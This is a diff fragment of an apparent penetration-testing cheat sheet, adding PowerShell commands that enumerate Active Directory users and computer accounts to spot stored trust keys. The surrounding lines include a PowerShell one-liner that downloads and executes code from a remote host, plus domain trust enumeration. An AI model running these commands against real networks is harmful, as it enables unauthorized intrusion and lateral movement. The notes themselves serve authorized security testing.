@@ -33,6 +33,9 @@ iwr http://[IP_ADDR]/[PATH] -OutFile [FILE]
 IEX(New-Object Net.Webclient).downloadString('http://[IP_ADDR]/[PATH]')
 Get-ADDomain | select DNSRoot,NetBIOSName,DomainSID   # retrieve SID
 nltest /domain_trusts   # show inbound/outbound trust
+Get-ADUser -Filter * | select SamAccountName    # list users(name ending with $ indicate trust keys being stored)
+Get-ADObject -LDAPFilter "objectClass=User" -Properties SamAccountName | select SamAccountName    # to retrieve user and computer accounts(ending with $)
+
 ```
 
 ### Metasploit
